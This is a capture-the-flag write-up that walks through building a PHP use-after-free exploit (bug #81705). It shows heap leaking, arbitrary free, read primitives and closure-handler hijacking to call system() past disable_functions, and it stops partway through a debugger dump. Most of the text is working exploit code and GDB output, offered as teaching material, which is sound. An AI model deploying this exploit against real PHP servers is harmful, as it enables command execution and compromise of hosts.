---
title: "In the land of PHP you will always be (use-after-)free"
date: 2022-04-06 13:37:00 +01:00
modified: 2022-04-06 13:37:00 +01:00
tags: [vulnerabilities, PHP, challenges, exploiting, X-C3LL]
description: "Write up about our challenge based on a highly restricted PHP environment"
image: 
---

Dear Fell**owl**ship, today's homily is about the quest of a poor human trying to escape the velvet jail of disable_functions and open_basedir in order to achieve the holy power of executing arbitrary commands. Please, take a seat and listen to the story of how our hero defeated PHP with the help of UAF The Magician.


# Prayers at the foot of the Altar a.k.a. disclaimer
*First of all we have to apologize because of our delay on the publication date: this post should have been released 7 days ago.* 

*The challenge was solved only by [@kachakil](https://twitter.com/kachakil) and [@samsa2k8](https://twitter.com/samsa2k8), you can read their approach [here](https://gist.github.com/kachakil/17ea369f5372e51f37ff825345fd9248). About 7-8 users were participating actively during the whole week, and only 2 (plus the winners) were in the right direction to get the flag, although everyone tried to use known exploits. Our intention was to avoid that and force people to craft their exploits from scratch but... a valid flag is a valid flag __:)__.*

*We are going to keep releasing different challenges during the year, so keep an eye. We promise to add a list of winners in our blog __:D__*

*In case you did not read our [tweet with the challenge](https://twitter.com/AdeptsOf0xCC/status/1508176163084115969), you can [deploy it locally with docker](https://github.com/Adepts-Of-0xCC/CHALLENGE-01) and try to solve it.*

*And last but not least, it is __CRUCIAL TO READ THIS ARTICLE BEFORE: [A deep dive into disable_functions bypasses and PHP exploitation](https://www.tarlogic.com/blog/disable_functions-bypasses-and-php-exploitation/)__. Tons of details about disable_functions and the exploit methodology is explained in depth in that article, so this information is not going to be repeated here. Be wise and stop reading the current post until you end the other.*


# Prologue

The intention of this first challenge was to highlight something that is pretty obvious for some of us but that others keep struggling to accept: disabling "well-known" functions and restricting the paths through open_basedir __IS TRIVIAL TO BYPASS__. People does not realize how easy they are to bypass. If you have a web platform that have vulnerabilities that could lead to the execution of arbitrary PHP, you are fucked. PHP is so full of "bugs" (we will not call them "vulnerabilities") in their own internals that it costs less than 5 minutes to find something abusable to bypass those restrictions. 

Of course __disabling functions is usefull and highly recommended__ because it is going to block most of script kiddies trying to pwn your server with the last vulnerability affecting a framework/CMS, but keep in mind that for a real attacker this is not going to stop him. And also this applies for pentesters and Red Teamers.

If you, our dearest reader, wonder about what sophisticated techniques we follow to identify "happy accidents" that can be used for bypassing... fuzzing? code review? Nah! Just go to the PHP bug tracker and search for juicy keywords and then sort by date:


<figure>
<img src="/Challenge01-PHP-UAF/PHPBUGTRACKER.png" alt="Results for use-after-free on PHP bugtracker"> 
<figcaption>
Results for "use-after-free" on PHP bugtracker
</figcaption>
</figure>

In our case the first one ([Bug #81705 	type confusion/UAF on set_error_handler with concat operation](https://bugs.php.net/bug.php?id=81705)) can fit our needs as the function `set_error_handler` is enabled.

# [Dream Theater - The root of all evil](https://www.youtube.com/watch?v=aK0Gi-bhC-o)

The issue and the root cause are well explained in the original report, so we are going to limit ourselves by quoting the original text:

*Here is a proof of concept for crash reproduction:*

```php
<?php

$my_var = str_repeat("a", 1);
set_error_handler(
    function() use(&$my_var) {
        echo("error\n");
        $my_var = 0x123;
    }
);
$my_var .= [0];

?>
```

*If you execute this snippet, it should cause SEGV at address 0x123.*

*(...)*

*When PHP executes the line `$my_var .= [0];`, it calls `concat_function` defined in Zend/zend_operators.c to try to concat given values. Since the given values may not be strings, `concat_function`tries to convert them into strings with [`zval_get_string_func`](https://github.com/php/php-src/blob/master/Zend/zend_operators.c#L1900).*

```c
ZEND_TRY_BINARY_OBJECT_OPERATION(ZEND_CONCAT);
	ZVAL_STR(&op1_copy, zval_get_string_func(op1));
	if (UNEXPECTED(EG(exception))) {
		zval_ptr_dtor_str(&op1_copy);
		if (orig_op1 != result) {
			ZVAL_UNDEF(result);
		}
		return FAILURE;
	}
```

*If the given value is an array, `zval_get_string_func` calls [`zend_error`](https://github.com/php/php-src/blob/master/Zend/zend_operators.c#L965).* 
```c
case IS_ARRAY:
	zend_error(E_WARNING, "Array to string conversion");
	return (try && UNEXPECTED(EG(exception))) ?
	NULL : ZSTR_KNOWN(ZEND_STR_ARRAY_CAPITALIZED);
```
*Because we can register an original error handler that is called by `zend_error` by using `set_error_handler`, we can run almost arbitrary codes DURING `concat_function` is running.*

*In the above PoC, for example, `$my_var` will be overwritten with integer 0x123 when `zend_error` is triggered. `concat_function`, however, implicitly assumes the variables `op1` and `op2` are always strings, and thus type confusion occurs as a result.*


Also is needed to quote this message from cmb in the same thread that clarifies the UAF situation:

*The problem is that `result` gets released[1] if it is identical to `op1_orig` (which is always the case for the concat assign operator).  For the script from comment 1641358352[2], that decreases the refcount to zero, but on shutdown, the literal stored in the op array will be released again.  If that script is modified to use a dynamic value (`range(1,4)` instead of `[1,2,3,4]`), its is already freed, when that code in `concat_function()` tries to release it again.*

*[1] <https://github.com/php/php-src/blob/php-8.1.1/Zend/zend_operators.c#L1928>*<br>	
*[2] <https://bugs.php.net/bug.php?id=81705#1641358352>*


So far we have a reproducible crash and primer for an exploit (in the same thread) from which we can draw ideas. In order to start building our exploit we are going to download PHP and compile it with debug symbols and without optimizations.

```sh
cd ../php-7.4.27/
./configure --disable-shared  --without-sqlite3 --without-pdo-sqlite
sed -i "s/ -O2 / -O0 /g" Makefile
make -j$(proc)
sudo make install
```

Here is my env (yes we are using an older version but do not worry in the epilogue we fix it __:P__):

```sh
PHP 7.4.27 (cli) (built: Feb 12 2022 16:45:41) ( NTS ) 
Copyright (c) The PHP Group
Zend Engine v3.4.0, Copyright (c) Zend Technologies
```

Let's run the reproducible crash on GDB using php-cli:

```c
   1860	 			}
   1861	 			op2 = &op2_copy;
   1862	 		}
   1863	 	} while (0);
   1864	 
          // op1=0x007fffffff70c0  →  [...]  →  0x0000000000000123
 → 1865	 	if (UNEXPECTED(Z_STRLEN_P(op1) == 0)) {
   1866	 		if (EXPECTED(result != op2)) {
   1867	 			if (result == orig_op1) {
   1868	 				i_zval_ptr_dtor(result);
   1869	 			}
   1870	 			ZVAL_COPY(result, op2);
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "php", stopped 0x555555b44039 in concat_function (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555b44039 → concat_function(result=0x7ffff3e55608, op1=0x7ffff3e55608, op2=0x7fffffff7400)
[#1] 0x555555caf4d1 → zend_binary_op(op2=0x7ffff3e911d0, op1=0x7ffff3e55608, ret=0x7ffff3e55608)
[#2] 0x555555caf4d1 → ZEND_ASSIGN_OP_SPEC_CV_CONST_HANDLER()
[#3] 0x555555cfb267 → execute_ex(ex=0x7ffff3e13020)
[#4] 0x555555cfe6e6 → zend_execute(op_array=0x7ffff3e80380, return_value=0x0)
[#5] 0x555555b5213c → zend_execute_scripts(type=0x8, retval=0x0, file_count=0x3)
[#6] 0x555555a8a8ae → php_execute_script(primary_file=0x7fffffffcbe0)
[#7] 0x555555d012b1 → do_cli(argc=0x2, argv=0x55555678a350)
[#8] 0x555555d026e5 → main(argc=0x2, argv=0x55555678a350)

```

We can confirm that the issue is present. If we check the original PoC reported on that bug tracker thread we can see this:

```php
// Just for attaching a debugger.
// Removing these lines makes the exploit fail,
// but it doesn't mean this exploit depends on fopen.
// By considering the heap memory that had been allocated for the stream object and
// adjusting heap memory, the exploit will succeed again.

$f = fopen(‘php://stdin’, ‘r’); 
fgets($f);

$my_var = [[1,2,3,4],[1,2,3,4]];
set_error_handler(function() use(&$my_var,&$buf){
    $my_var=1;
    $buf=str_repeat(“xxxxxxxx\x00\x00\x00\x00\x00\x00\x00\x00", 16);
});
$my_var[1] .= 1234;

$my_var[1] .= 1234;

$obj_addr = 0;
for ($i = 23; $i >= 16; $i--){
    $obj_addr *= 256;
    $obj_addr += ord($buf[$i]);
}

```

This code can be adapted to confirm the UAF issue. In our case we can edit it to leak 0x100 bytes of memory:

```php
<?php

function leak_test() {
    $contiguous = [];
        for ($i = 0; $i < 10; $i++) {
            $contiguous[] = alloc(0x100, "D");
        }
    $arr = [[1,3,3,7], [5,5,5,5]];
    set_error_handler(function() use (&$arr, &$buf) {
        $arr = 255;
        $buf = str_repeat("\x00", 0x100);
    });
    $arr[1] .= 1337; 
    return $buf;
}


function alloc($size, $canary) {
    return str_shuffle(str_repeat($canary, $size));
}


print leak_test();

?>
```

When we print the `$buf` variable we can see memory leaked (the pointer in the hex dump is a clear indicator of it -also this pointer is a good leak of the heap-):

```sh
➜  concat-exploit php blog01.php | xxd
00000000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000010: 6019 40b8 8f7f 0000 0601 0000 0000 0000  `.@.............
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
````

Keep in mind that PHP believes this `$buf` is a string so we can access to read/modify bytes in memory by just `$buff[offset]`. This means we have a relative write/read primitive that we need to weaponize.

# [The Primitives - Crash](https://www.youtube.com/watch?v=1y7NGqfZteg)

Once we have identified the vulnerability and how to trigger it we need to find a way to get arbitrary read and write primitives. To build our exploit we are going to follow a similar schema as the exploit that [Mm0r1](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php) created for the BackTrace bug (the exploit is explained in depth in the article linked at the beggining of this post, so go and read it!).


If you remember this fragment from the quoted thread:

	The problem is that result gets released[1] if it is identical to op1_orig (which is always the case for the concat assign operator)

We can take advantage of this to get the ability to release memory at our will. As we saw with the `0x123` crash example, we can forge a fake value that is going to be passed to the PHP internal functions in charge to release memory. Let's build a De Bruijn pattern using `ragg2` and use it:

```php
<?php

function free() {

         $contiguous = [];
            for ($i = 0; $i < 10; $i++) {
                $contiguous[] = alloc(0x100, "D");
            }
        $arr = [[1,3,3,7], [5,5,5,5]];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABY", 0x1);
        });
        $arr[1] .= 1337;
        
    }


function alloc($size, $canary) {
    return str_shuffle(str_repeat($canary, $size));
}




print free();

?>
```

Fire in the hole!

```c
─────────────────────────────────────────────────────────────────────────────────────────────── source:/home/vagrant/E[...].h+1039 ────
   1034	 	ZEND_RC_MOD_CHECK(p);
   1035	 	return ++(p->refcount);
   1036	 }
   1037	 
   1038	 static zend_always_inline uint32_t zend_gc_delref(zend_refcounted_h *p) {
          // p=0x007fffffff72b8  →  0x4141484141474141
 → 1039	 	ZEND_ASSERT(p->refcount > 0);
   1040	 	ZEND_RC_MOD_CHECK(p);
   1041	 	return --(p->refcount);
   1042	 }
   1043	 
   1044	 static zend_always_inline uint32_t zend_gc_addref_ex(zend_refcounted_h *p, uint32_t rc) {
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "php", stopped 0x555555b44b2f in zend_gc_delref (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555b44b2f → zend_gc_delref(p=0x4141484141474141)
[#1] 0x555555b44b2f → i_zval_ptr_dtor(zval_ptr=0x7ffff3e5cba8)
[#2] 0x555555b44b2f → concat_function(result=0x7ffff3e5cba8, op1=0x7fffffff7310, op2=0x7fffffff7320)
[#3] 0x555555caf02b → zend_binary_op(op2=0x7ffff3e97390, op1=0x7ffff3e5cba8, ret=0x7ffff3e5cba8)
[#4] 0x555555caf02b → ZEND_ASSIGN_DIM_OP_SPEC_CV_CONST_HANDLER()
[#5] 0x555555cfb257 → execute_ex(ex=0x7ffff3e13020)
[#6] 0x555555cfe6e6 → zend_execute(op_array=0x7ffff3e802a0, return_value=0x0)
[#7] 0x555555b5213c → zend_execute_scripts(type=0x8, retval=0x0, file_count=0x3)
[#8] 0x555555a8a8ae → php_execute_script(primary_file=0x7fffffffcbe0)
[#9] 0x555555d012b1 → do_cli(argc=0x2, argv=0x55555678a350)
```

As we can see part of our pattern arrived to the `zend_gc_delref` function and crashed. This function tries to decrease the reference counter, and it is called from `i_zval_ptr_dtor`:
```c
static zend_always_inline void i_zval_ptr_dtor(zval *zval_ptr)
{
	if (Z_REFCOUNTED_P(zval_ptr)) {
		zend_refcounted *ref = Z_COUNTED_P(zval_ptr);
		if (!GC_DELREF(ref)) {
			rc_dtor_func(ref);
		} else {
			gc_check_possible_root(ref);
		}
	}
}
```

This function is used to destroy the variable passed as argument (a pointer to the desired `zval`, we can see the pointer is the same used as `result` in the concatenation). In our case a pointer to part of the faked contents at `$buf`. So if we change that part for "X" we should verify that we can control what is going to be released:

```php
 $buf = str_repeat("AAABAACAADAAEAAF" . XXXXXXXX . "IAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABY", 0x1);
 ```

 ```c
   1034	 	ZEND_RC_MOD_CHECK(p);
   1035	 	return ++(p->refcount);
   1036	 }
   1037	 
   1038	 static zend_always_inline uint32_t zend_gc_delref(zend_refcounted_h *p) {
          // p=0x007fffffff72b8  →  0x5858585858585858
 → 1039	 	ZEND_ASSERT(p->refcount > 0);
   1040	 	ZEND_RC_MOD_CHECK(p);
   1041	 	return --(p->refcount);
   1042	 }
   1043	 
   1044	 static zend_always_inline uint32_t zend_gc_addref_ex(zend_refcounted_h *p, uint32_t rc) {
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "php", stopped 0x555555b44b2f in zend_gc_delref (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x555555b44b2f → zend_gc_delref(p=0x5858585858585858)
[#1] 0x555555b44b2f → i_zval_ptr_dtor(zval_ptr=0x7ffff3e5d328)
[#2] 0x555555b44b2f → concat_function(result=0x7ffff3e5d328, op1=0x7fffffff7310, op2=0x7fffffff7320)
[#3] 0x555555caf02b → zend_binary_op(op2=0x7ffff3e95390, op1=0x7ffff3e5d328, ret=0x7ffff3e5d328)
[#4] 0x555555caf02b → ZEND_ASSIGN_DIM_OP_SPEC_CV_CONST_HANDLER()
[#5] 0x555555cfb257 → execute_ex(ex=0x7ffff3e13020)
[#6] 0x555555cfe6e6 → zend_execute(op_array=0x7ffff3e802a0, return_value=0x0)
[#7] 0x555555b5213c → zend_execute_scripts(type=0x8, retval=0x0, file_count=0x3)
[#8] 0x555555a8a8ae → php_execute_script(primary_file=0x7fffffffcbe0)
[#9] 0x555555d012b1 → do_cli(argc=0x2, argv=0x55555678a350)
```

At this point we can:
1. Leak a pointer from memory
2. Free arbitrarily

We can use the leaked pointer to know the location of another variable that we allocate as placeholder and then free that variable.

```php
<?php

class exploit {
public function __construct($cmd) {
    $concat_result_addr = $this->leak_heap();
    print "[+] Concated string address:\n0x";
    print dechex($concat_result_addr);
    $this->placeholder = $this->alloc(0x4F, "B");
    $placeholder_addr = $concat_result_addr+0xe0;
    print "\n[+] Placeholder string address:"; 
    print "\n0x".dechex($placeholder_addr);
    print "\n[+] Before free:\n";
    debug_zval_dump($this->placeholder);
    $this->free($placeholder_addr);
    print "\n[+] After free:\n";
    debug_zval_dump($this->placeholder);
}


private function leak_heap() {
	$contiguous = [];
 		for ($i = 0; $i < 10; $i++) {
			$contiguous[] = $this->alloc(0x100, "D");
 		}
    $arr = [[1,3,3,7], [5,5,5,5]];
    set_error_handler(function() use (&$arr, &$buf) {
        $arr = 1337;
        $buf = str_repeat("\x00", 0x100);
    });
    $arr[1] .= $this->alloc(0x4A, "F"); // 0x4F - 5 from the length of "Array" string concatenated
    return $this->str2ptr($buf, 16);
}


private function free($var_addr) {
    $contiguous = [];
        for ($i = 0; $i < 10; $i++) {
            $contiguous[] = $this->alloc(0x100, "D");
        }
    $arr = [[1,3,3,7], [5,5,5,5]];
    set_error_handler(function() use (&$arr, &$buf, &$var_addr) {
        $arr = 1;
        $buf = str_repeat("AAABAACAADAAEAAF" . $this->ptr2str($var_addr) . "IAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABY", 0x1);
    });
    $arr[1] .= 1337;
}


private function alloc($size, $canary) {
    return str_shuffle(str_repeat($canary, $size));
}


private function str2ptr($str, $p = 0, $n = 8) {
    $address = 0;
    for($j = $n - 1; $j >= 0; $j--) {
        $address <<= 8;
        $address |= ord($str[$p + $j]);
    }
    return $address;
}

private function ptr2str($ptr, $m = 8) {
    $out = "";
    for ($i=0; $i < $m; $i++) {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

}

new exploit("haha");
?>
```

And we can see that it worked:
```c
➜  concat-exploit php blog03.php 
[+] Concated string address:
0x7f763f27a070
[+] Placeholder string address:
0x7f763f27a150
[+] Before free:
string(79) "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" refcount(2)

[+] After free:
string(79) "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" refcount(1059561697)
```

As we said before, we are going to build step by step an exploit similar to the one explained in the article [A deep dive into disable_functions bypasses and PHP exploitation](https://www.tarlogic.com/blog/disable_functions-bypasses-and-php-exploitation/), reusing as much as we can. So we are going to take advantage of our ability to free memory to create a hole that is going to be occupied by an object that we are going to use for reading/writing arbitrary memory. As we know where the hole is (the address of the placeholder, that is calculated applying an offset to the leaked address), we can access to the properties' memory contents directly (`$placeholder[offset]`) and use them to leak memory at any desired address. We can perform an easy test:

```php
<?php

class Helper { public $a, $b, $c, $d; }  

class exploit {
public function __construct($cmd) {
    $concat_result_addr = $this->leak_heap();
    print "[+] Concated string address:\n0x";
    print dechex($concat_result_addr);
    $this->placeholder = $this->alloc(0x4F, "B");
    $placeholder_addr = $concat_result_addr+0xe0;
    print "\n[+] Placeholder string address:"; 
    print "\n0x".dechex($placeholder_addr);
    $this->free($placeholder_addr);
    $this->helper = new Helper;
    $this->helper->a = "KKKK";
}


private function leak_heap() {
	$contiguous = [];
 		for ($i = 0; $i < 10; $i++) {
			$contiguous[] = $this->alloc(0x100, "D");
 		}
    $arr = [[1,3,3,7], [5,5,5,5]];
    set_error_handler(function() use (&$arr, &$buf) {
        $arr = 1337;
        $buf = str_repeat("\x00", 0x100);
    });
    $arr[1] .= $this->alloc(0x4A, "F");
    return $this->str2ptr($buf, 16);
}


private function free($var_addr) {
    $contiguous = [];
        for ($i = 0; $i < 10; $i++) {
            $contiguous[] = $this->alloc(0x100, "D");
        }
    $arr = [[1,3,3,7], [5,5,5,5]];
    set_error_handler(function() use (&$arr, &$buf, &$var_addr) {
        $arr = 1;
        $buf = str_repeat("AAABAACAADAAEAAF" . $this->ptr2str($var_addr) . "IAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABY", 0x1);
    });
    $arr[1] .= 1337;
}


private function alloc($size, $canary) {
    return str_shuffle(str_repeat($canary, $size));
}


private function str2ptr($str, $p = 0, $n = 8) {
    $address = 0;
    for($j = $n - 1; $j >= 0; $j--) {
        $address <<= 8;
        $address |= ord($str[$p + $j]);
    }
    return $address;
}

private function ptr2str($ptr, $m = 8) {
    $out = "";
    for ($i=0; $i < $m; $i++) {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

}

new exploit("haha");
?>
```

Our new object (`$helper`) is going to take the location of our `$placeholder` freed, so we can review the memory at that address:

```c
gef➤  x/30g 0x7ffff3e7a150
0x7ffff3e7a150:	0x0000001800000001	0x0000000000000004
0x7ffff3e7a160:	0x00007ffff3e03018	0x00005555567527c0
0x7ffff3e7a170:	0x0000000000000000	0x00007ffff3e55ec0 <--- helper->a
0x7ffff3e7a180:	0x0000000000000006	0x8000065301d853e5
0x7ffff3e7a190:	0x0000000000000001	0x8000065301d853e5
0x7ffff3e7a1a0:	0x0000000000000001	0x8000065301d853e5
0x7ffff3e7a1b0:	0x0000000000000001	0x0000000000000000
0x7ffff3e7a1c0:	0x00007ffff3e7a230	0x0000000000000000
0x7ffff3e7a1d0:	0x0000000000000000	0x0000000000000000
0x7ffff3e7a1e0:	0x0000000000000000	0x0000000000000000
0x7ffff3e7a1f0:	0x0000000000000000	0x0000000000000000
0x7ffff3e7a200:	0x0000000000000000	0x0000000000000000
0x7ffff3e7a210:	0x0000000000000000	0x0000000000000000
0x7ffff3e7a220:	0x0000000000000000	0x0000000000000000
0x7ffff3e7a230:	0x00007ffff3e7a2a0	0x0000000000000000
```

We can see that the property `a` (that is a string) is located at `0x7ffff3e7a178` (0x7ffff3e7a150 + 0x28). We can verify it:

```c
gef➤  x/30g 0x00007ffff3e55ec0
0x7ffff3e55ec0:	0x0000004600000001	0x800000017c8778f1
0x7ffff3e55ed0:	0x0000000000000004	0x000072004b4b4b4b <-- 4b == K
0x7ffff3e55ee0:	0x0000004600000001	0x8000000000597a79
0x7ffff3e55ef0:	0x0000000000000002	0x0000000000007a7a
0x7ffff3e55f00:	0x00007ffff3e555c0	0x00007ffff3e60300
0x7ffff3e55f10:	0x00007ffff3e60360	0x0000555556795a50
0x7ffff3e55f20:	0x00007ffff3e55f40	0x0000000000000000
0x7ffff3e55f30:	0x0000000000000000	0x0000000000000000
0x7ffff3e55f40:	0x00007ffff3e55f60	0x0000000000000000
0x7ffff3e55f50:	0x0000000000000000	0x0000000000000000
0x7ffff3e55f60:	0x00007ffff3e55f80	0x0000000000000000
0x7ffff3e55f70:	0x0000000000000000	0x0000000000000000
0x7ffff3e55f80:	0x00007ffff3e55fa0	0x0000000000000000
0x7ffff3e55f90:	0x0000000000000000	0x0000000000000000
0x7ffff3e55fa0:	0x00007ffff3e55fc0	0x0000000000000000
```

The "KKKK" (4b4b4b4b) string is in that place. In PHP 7 strings are saved inside the structure `zend_string` that is defined as:

```c
struct _zend_string {
    zend_refcounted_h gc;
    zend_ulong h;
    size_t len;
    char val[1]; // NOT A "char *"
};
```

So if we interpret this memory as a `zend_string` we can visualize it better:

```c
gef➤  print (zend_string)*0x00007ffff3e55ec0
$3 = {
  gc = {
    refcount = 0x1, 
    u = {
      type_info = 0x46
    }
  }, 
  h = 0x800000017c8778f1, 
  len = 0x4, 
  val = "K"
}
```

As we can overwrite bytes inside the `$helper` object, we can take advantage of it to overwrite the pointer to the original `a` string (our "KKKK") with a pointer to any desired address. After overwriting the pointer, we can read safely the bytes at the address + 0x10 (`len` field inside `zend_string`) calling `strlen()` with our `$helper->a`. Using this simple trick we can get an arbitrary read primitive:

```php
private function write(&$str, $p, $v, $n = 8) {
    $i = 0;
    for ($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
    }
}
private function leak($addr, $p = 0, $s = 8) {
    $this->write($this->placeholder, 0x10, $addr);
    $leak = strlen($this->helper->a);
    if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
    return $leak;
    }
```

# [Iggy & The Stooges - Search And Destroy](https://www.youtube.com/watch?v=LC9km8qnbOY)

The next step in our exploit is to search where the `basic_functions` structure is located in memory, and then walk it until we find the handler for `zif_system` or similar functions that allow us the execution of commands. Although this is really well explained in the quoted article, let's just give it a short explanation here.

In PHP the “basic” functions are grouped into `basic_functions` for registration, this being an array of `zend_function_entry` structures. Therefore, in this `basic_functions` we will have, ultimately, an ordered relationship of function names along with the pointer to them (handlers). The `zend_function_entry` structure is defined as:

```c
typedef struct _zend_function_entry {
    const char *fname;
    void (*handler)(INTERNAL_FUNCTION_PARAMETERS);
    const struct _zend_internal_arg_info *arg_info;
    uint32_t num_args;
    uint32_t flags;
} zend_function_entry;
```

So the first member is a pointer to a string that contains the function name, and the next member is a handler to that function. In order to identify a member of the `basic_functions` structure we can follow the next approach:

1. Read 8 bytes from an address ---> Interpret those bytes as a pointer --> Read 8 bytes at the pointed memory
2. Does the 8 bytes match our needle (bin2hex function name) ? If it doesn't, increase the address by 8 and repeat __1__

It can be translated to:

```php
private function get_basic_funcs($base) {
    for ($i = 0; $i < 0x6700/8; $i++) {
        $leak = $this->leak($base - $i * 8);
        if (($base - $leak) > 0 && ($leak & 0xfffffffff0000000 ) == ($base & 0xfffffffff0000000 )) {
            $deref = $this->leak($leak);
            if ($deref != 0x6e69623278656800){ // 'nib2xeh\x00' ---> bin2hex
                continue;
            }
        } else continue;
        return $base - ($i-2) * 8;
    }
}
```

Once we have found where the `zend_function_entry` that holds the information for `bin2hex()` is located, we can repeat the process to locate the handler for `zif_system`:

```php
    private function get_system($basic_funcs) {
    $addr = $basic_funcs;
    $i = 0;
    do {
        $f_entry = $this->leak($addr-0x10);
        $f_name = $this->leak($f_entry);
        if ($f_name == 0x736500646d636c6c) { //'se\x00dmcll'
            return $this->leak($addr + 8-0x10);
        }
        $addr += 0x20;
        $i += 1;
    } while ($f_entry != 0);
    return false;
}
```

Another aproach to locate the `zif_system` handler could be to just apply a pre-known offset to the `zend_function_entry` for `bin2hex` because the entries in the array are ordered.


# [Van Halen - Jump](https://www.youtube.com/watch?v=SwYN7mTi6HM)

Our exploit has all the ingredients ready, except from the last one: jumping into the target function. In order to call `zif_system` we are going to add a closure to our helper object and overwrite it. Closures are anonymous functions with the following structure:

```c
typedef struct _zend_closure {
    zend_object std;
    zend_function func;
    zval this_ptr;
    zend_class_entry *called_scope;
    zif_handler orig_internal_handler;
} zend_closure;
```

If we look carefully we can see that one of the members is a `zend_function` structure:

```c
union _zend_function {
	zend_uchar type;	/* MUST be the first element of this struct! */
	zend_op_array op_array;
	zend_internal_function internal_function;
};
```

And `zend_internal_function` is:

```c
typedef struct _zend_internal_function {
    /* Common elements */
    zend_uchar type;
    zend_uchar arg_flags[3]; /* bitset of arg_info.pass_by_reference */
    uint32_t fn_flags;
    zend_string* function_name;
    zend_class_entry *scope;
    zend_function *prototype;
    uint32_t num_args;
    uint32_t required_num_args;
    zend_internal_arg_info *arg_info;
    /* END of common elements */
    zif_handler handler;
    struct _zend_module_entry *module;
    void *reserved[ZEND_MAX_RESERVED_RESOURCES];
} zend_internal_function;
```

We can see the `handler` member. So the plan is easy:

1. Copy the original `zend_closure` structure to other part
2. Patch the `$helper` object to point to this new location instead of the original
3. Patch the `handler` member to point to our `zif_system`
4. Call the closure

The resultant code:

```php
//...
$this->helper->b = function ($x) { };
//...
$fake_obj_offset = 0xd8;
for ($i = 0; $i < 0x110; $i += 8) {
	$this->write($this->placeholder, $fake_obj_offset + $i, $this->leak($closure_addr-0x10+$i));
}
$fake_obj_addr = $placeholder_addr +  $fake_obj_offset + 0x18;
print "\n[+] Fake Closure addr:\n0x" . dechex($fake_obj_addr);
$this->write($this->placeholder, 0x20, $fake_obj_addr);
$this->write($this->placeholder, $fake_obj_offset + 0x38, 1, 4); # internal func type
$this->write($this->placeholder, $fake_obj_offset + 0x68, $system); # internal func handler
     
($this->helper->b)($cmd);
```

Original closure:

```c
gef➤  print (zend_closure) * 0x7ffff3e5ce00
$5 = {
  std = {
    gc = {
      refcount = 0x1, 
      u = {
        type_info = 0x18
      }
    }, 
    handle = 0x5, 
    ce = 0x5555567ea530, 
    handlers = 0x55555676daa0 <closure_handlers>, 
 ...
    internal_function = {
      type = 0x2, 
      arg_flags = "\000\000", 
      fn_flags = 0x2100001, 
      function_name = 0x7ffff3e01960, 
      scope = 0x7ffff3e032a0, 
      prototype = 0x0, 
      num_args = 0x1, 
      required_num_args = 0x1, 
      arg_info = 0x7ffff3e6b0c0, 
      handler = 0x100000000, 
      module = 0x200000000, 
      reserved = {0x7ffff3e72140, 0x7ffff3e03630, 0x7ffff3e5ce90, 0x0, 0x7ffff3e8d018, 0x7ffff3e8d010}
    }
...

```

Fake closure after patching it:
```c
gef➤  print (zend_closure) * 0x7ffff3e7a240
$6 = {
  std = {
